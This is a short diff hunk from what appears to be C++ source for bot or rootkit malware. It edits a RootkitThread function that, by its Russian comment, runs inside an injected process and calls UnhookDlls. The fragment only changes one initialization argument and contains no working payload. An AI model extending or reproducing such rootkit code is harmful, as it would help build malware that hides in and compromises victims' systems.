@@ -500,7 +500,7 @@ void RootkitDoStartApplication(TEventData *Data, DWORD AppHash)
 
 DWORD WINAPI RootkitThread(LPVOID)
 {
-	BOT::Initialize();
+	BOT::Initialize(ProcessUnknown);
 
     // Поток работает в заинжекченном процессе
 	UnhookDlls();
